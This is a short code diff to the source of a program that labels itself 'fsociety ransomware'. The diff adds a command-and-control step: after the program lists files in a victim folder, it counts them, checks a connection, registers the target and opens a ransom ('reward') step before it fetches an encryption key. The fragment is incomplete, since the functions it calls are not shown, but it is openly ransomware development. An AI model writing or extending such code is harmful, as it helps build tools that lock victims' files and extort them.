@@ -5,6 +5,7 @@
     #include <windows.h>
 #endif
 #include "fsociety.h"
+#include "after_day.h"
 // fsociety ransomware by graniet
 
 int main(void)
@@ -19,6 +20,11 @@ int main(void)
     #endif
     char *folder = "/root/Bureau";
     fs.listfiledirectory(folder);
+    CandC command;
+    command.nb_file = fs.number_to_string(fs.nb_file);
+    command.checkifconnected();
+    command.insert_target();
+    command.openReward();
     secret_key = fs.get_secret_key();
    //std::cout << "secret key : " << secret_key << std::endl;
 }
